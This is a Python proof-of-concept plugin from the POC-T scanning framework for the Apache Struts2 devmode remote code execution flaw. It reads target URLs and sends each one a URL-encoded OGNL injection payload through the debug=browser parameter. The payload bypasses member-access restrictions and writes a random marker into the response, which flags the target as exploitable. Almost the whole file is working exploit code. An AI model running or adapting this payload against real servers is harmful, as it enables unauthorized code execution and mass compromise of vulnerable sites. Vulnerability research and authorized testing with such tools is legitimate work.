#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
Struts S2-devmode RCE PoC

Usage:
  python POC-T.py -T -m struts2-devmode -f [file]
"""

import requests
from plugin.useragent import firefox
from plugin.util import randomString


def poc(url):
    # if '|' in url:
    #     url = url.split('|')[1]
    if '://' not in url:
        url = 'http://' + url
    if '?' in url:
        url = url.split('?')[0]
    key = randomString()
    payload = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=" + key
    target = (url + payload)
    try:
        c = requests.get(target, headers={'User-Agent': firefox()}, timeout=5).content
        if key in c and 'xwork2.dispatcher' not in c:
            return url
    except Exception, e:
        return False
    return False
